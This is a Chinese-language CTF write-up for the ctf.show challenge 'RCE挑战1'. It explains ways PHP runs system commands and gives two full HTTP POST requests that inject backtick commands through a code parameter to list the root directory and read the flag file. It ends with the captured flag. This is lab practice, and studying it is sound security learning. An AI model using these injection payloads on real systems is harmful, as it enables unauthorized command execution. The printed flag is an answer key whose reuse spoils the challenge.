# RCE挑战1

[题目地址](https://ctf.show/challenges#RCE%E6%8C%91%E6%88%981-3916)

这题和之前的一个[红包题](https://blog.csdn.net/qq_44657899/article/details/108011373)一样的思路，还简单了不少。重点在于这个执行命令的方式这个知识点。有一下3种方式来执行系统命令（举例ls，cat也能这么用）：

```
system('ls');
echo(`ls`);   echo+反引号
?><?=`ls`;
<?=是echo()的别名用法，不需要开启short_open_tag。
需要先?>把前面已有的<?php给闭合掉
```

知道这个就很简单了。构造payload。

```
POST / HTTP/1.1
Host: 0f11b105-32dc-4ec3-9067-97f2e127691e.challenge.ctf.show
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

code=?><?=`ls /`;
```

注意是post，我发了半天get，还疑惑为什么不行……得知flag名为f1agaaa。cat直接出来。

```
POST / HTTP/1.1
Host: 0f11b105-32dc-4ec3-9067-97f2e127691e.challenge.ctf.show
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

code=?><?=`cat  /f1agaaa`;
```

## Flag
> ctfshow{193bfec3-88a5-418f-8499-6e4da9e32650}